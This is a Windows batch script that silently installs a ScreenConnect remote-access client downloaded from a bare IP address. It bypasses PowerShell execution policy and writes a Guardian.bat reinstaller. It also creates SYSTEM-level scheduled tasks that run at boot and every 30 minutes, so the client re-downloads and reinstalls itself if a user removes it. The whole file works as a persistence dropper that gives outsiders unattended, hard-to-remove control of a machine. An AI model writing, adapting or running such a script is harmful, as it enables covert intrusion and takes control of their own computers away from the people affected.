@echo off
setlocal

:: ================= CONFIG =================
set "MSI_URL=http://194.59.31.232:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "APP_NAME=ScreenConnect"
set "SAFE_DIR=C:\ProgramData\%APP_NAME%"
set "MSI_TEMP=%TEMP%\%APP_NAME%.msi"

:: ============================================
:: ADMIN CHECK
:: ============================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: You must run this file as Administrator.
    echo Right-click the file and select "Run as administrator".
    pause
    exit /b 1
)

echo ==========================================
echo  ScreenConnect Auto-Recovery Setup
echo ==========================================
echo.

:: ============================================
:: CREATE SAFE DIRECTORY
:: ============================================
echo [*] Creating safe directory...
if not exist "%SAFE_DIR%" mkdir "%SAFE_DIR%"

:: ============================================
:: DOWNLOAD MSI
:: ============================================
echo [*] Downloading installer from URL...
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%MSI_URL%' -OutFile '%MSI_TEMP%' -UseBasicParsing"
if not exist "%MSI_TEMP%" (
    echo [ERROR] Download failed. Check your internet and URL.
    pause
    exit /b 1
)
echo [OK] Downloaded to %MSI_TEMP%

:: ============================================
:: SILENT INSTALL
:: ============================================
echo [*] Installing silently...
msiexec /i "%MSI_TEMP%" /qn /norestart
timeout /t 30 /nobreak >nul

:: ============================================
:: DETECT SCREENCONNECT SERVICE
:: ============================================
echo [*] Detecting ScreenConnect service...
set "SVC_NAME="

echo $svc = Get-Service ^| Where-Object { $_.Name -like '*ScreenConnect*' -or $_.DisplayName -like '*ScreenConnect*' } ^| Select-Object -First 1 > "%TEMP%\find_svc.ps1"
echo if ($svc^) { $svc.Name } else { 'NONE' } >> "%TEMP%\find_svc.ps1"

for /f "usebackq delims=" %%a in (`powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\find_svc.ps1"`) do (
    set "SVC_NAME=%%a"
)
del "%TEMP%\find_svc.ps1" >nul 2>&1

if "%SVC_NAME%"=="NONE" (
    echo [WARNING] No ScreenConnect service found.
    echo [*] Verifying product installation...
    reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /f "ScreenConnect" >nul 2>&1
    if %errorlevel% neq 0 (
        reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s /f "ScreenConnect" >nul 2>&1
    )
    if %errorlevel% == 0 (
        echo [OK] ScreenConnect product verified.
    ) else (
        echo [ERROR] ScreenConnect does not appear to be installed.
        pause
        exit /b 1
    )
) else (
    echo [OK] Found service: %SVC_NAME%
    echo [*] Setting service to auto-start...
    sc config "%SVC_NAME%" start= auto >nul 2>&1
    echo [*] Starting service...
    sc start "%SVC_NAME%" >nul 2>&1
    timeout /t 5 /nobreak >nul
)

:: ============================================
:: CREATE SERVICE STARTER HELPER (fixes schtasks quoting)
:: ============================================
set "STARTER=%SAFE_DIR%\StartService.bat"
echo @echo off > "%STARTER%"
echo sc start "%SVC_NAME%" ^>nul 2^>^&1 >> "%STARTER%"
echo exit /b 0 >> "%STARTER%"
echo [OK] Service starter created at %STARTER%

:: ============================================
:: CREATE MAIN AUTO-START TASK
:: ============================================
echo [*] Creating main auto-start task...
schtasks /delete /tn "%APP_NAME%Service" /f >nul 2>&1
schtasks /create /tn "%APP_NAME%Service" /tr "%STARTER%" /sc onstart /ru SYSTEM /rl highest /f >nul
echo [OK] Task '%APP_NAME%Service' created (starts at boot)

:: ============================================
:: AUTO-GENERATE GUARDIAN.BAT
:: ============================================
echo [*] Generating Guardian.bat (auto-reinstaller)...
set "GUARD=%SAFE_DIR%\Guardian.bat"

echo @echo off > "%GUARD%"
echo setlocal >> "%GUARD%"
echo set "MSI_URL=%MSI_URL%" >> "%GUARD%"
echo set "APP_NAME=%APP_NAME%" >> "%GUARD%"
echo set "SAFE_DIR=%SAFE_DIR%" >> "%GUARD%"
echo set "LOG=%SAFE_DIR%\guardian.log" >> "%GUARD%"
echo set "SVC_NAME=%SVC_NAME%" >> "%GUARD%"
echo set "STARTER=%SAFE_DIR%\StartService.bat" >> "%GUARD%"
echo. >> "%GUARD%"
echo :: Check if service still exists >> "%GUARD%"
echo if not "%%SVC_NAME%%"=="NONE" ( >> "%GUARD%"
echo     sc query "%%SVC_NAME%%" ^>nul 2^>^&1 >> "%GUARD%"
echo     if errorlevel 1 ( >> "%GUARD%"
echo         echo %%date%% %%time%% [ALERT] Service missing. Reinstalling... ^>^> "%%LOG%%" >> "%GUARD%"
echo         goto :reinstall >> "%GUARD%"
echo     ) >> "%GUARD%"
echo     sc query "%%SVC_NAME%%" ^| find /i "RUNNING" ^>nul >> "%GUARD%"
echo     if errorlevel 1 ( >> "%GUARD%"
echo         echo %%date%% %%time%% [INFO] Service stopped. Starting... ^>^> "%%LOG%%" >> "%GUARD%"
echo         sc start "%%SVC_NAME%%" ^>nul 2^>^&1 >> "%GUARD%"
echo     ) >> "%GUARD%"
echo     exit /b 0 >> "%GUARD%"
echo ) else ( >> "%GUARD%"
echo     reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /f "ScreenConnect" ^>nul 2^>^&1 >> "%GUARD%"
echo     if errorlevel 1 ( >> "%GUARD%"
echo         reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s /f "ScreenConnect" ^>nul 2^>^&1 >> "%GUARD%"
echo     ) >> "%GUARD%"
echo     if errorlevel 1 ( >> "%GUARD%"
echo         echo %%date%% %%time%% [ALERT] Product missing. Reinstalling... ^>^> "%%LOG%%" >> "%GUARD%"
echo         goto :reinstall >> "%GUARD%"
echo     ) >> "%GUARD%"
echo     exit /b 0 >> "%GUARD%"
echo ) >> "%GUARD%"
echo. >> "%GUARD%"
echo :reinstall >> "%GUARD%"
echo set "MSI_TEMP=%%TEMP%%\%APP_NAME%.msi" >> "%GUARD%"
echo powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%%MSI_URL%%' -OutFile '%%TEMP%%\%APP_NAME%.msi' -UseBasicParsing" ^>nul 2^>^&1 >> "%GUARD%"
echo if not exist "%%TEMP%%\%APP_NAME%.msi" ( >> "%GUARD%"
echo     echo %%date%% %%time%% [ERROR] Download failed ^>^> "%%LOG%%" >> "%GUARD%"
echo     exit /b 1 >> "%GUARD%"
echo ) >> "%GUARD%"
echo msiexec /i "%%TEMP%%\%APP_NAME%.msi" /qn /norestart ^>nul 2^>^&1 >> "%GUARD%"
echo timeout /t 30 /nobreak ^>nul >> "%GUARD%"
echo if not "%%SVC_NAME%%"=="NONE" ( >> "%GUARD%"
echo     sc start "%%SVC_NAME%%" ^>nul 2^>^&1 >> "%GUARD%"
echo ) >> "%GUARD%"
echo echo %%date%% %%time%% [OK] Reinstalled ^>^> "%%LOG%%" >> "%GUARD%"
echo del "%%TEMP%%\%APP_NAME%.msi" ^>nul 2^>^&1 >> "%GUARD%"
echo exit /b 0 >> "%GUARD%"

echo [OK] Guardian.bat created at %GUARD%

:: ============================================
:: SCHEDULE GUARDIAN TO RUN AT BOOT
:: ============================================
echo [*] Creating Guardian boot task...
schtasks /delete /tn "%APP_NAME%Guardian" /f >nul 2>&1
schtasks /create /tn "%APP_NAME%Guardian" /tr "%GUARD%" /sc onstart /ru SYSTEM /rl highest /f >nul
echo [OK] Guardian will run at every boot

:: ============================================
:: SCHEDULE GUARDIAN TO CHECK EVERY 30 MIN
:: ============================================
echo [*] Creating periodic check task...
schtasks /delete /tn "%APP_NAME%GuardianCheck" /f >nul 2>&1
schtasks /create /tn "%APP_NAME%GuardianCheck" /tr "%GUARD%" /sc minute /mo 30 /ru SYSTEM /rl highest /f >nul
echo [OK] Guardian checks every 30 minutes

:: ============================================
:: CLEANUP
:: ============================================
del "%MSI_TEMP%" >nul 2>&1

:: ============================================
:: DONE
:: ============================================
echo.
echo ==========================================
echo  AUTO-RECOVERY SYSTEM READY
echo ==========================================
echo Install Dir : %SAFE_DIR%
echo Guardian    : %SAFE_DIR%\Guardian.bat
echo Starter     : %STARTER%
echo Log File    : %SAFE_DIR%\guardian.log
echo Service     : %SVC_NAME%
echo.
echo What happens if deleted or uninstalled:
echo   1. Guardian detects it on next boot
echo   2. Or within 30 minutes (periodic check)
echo   3. Auto-downloads MSI from your URL
echo   4. Silently reinstalls
echo   5. Recreates service and starts it
echo ==========================================
pause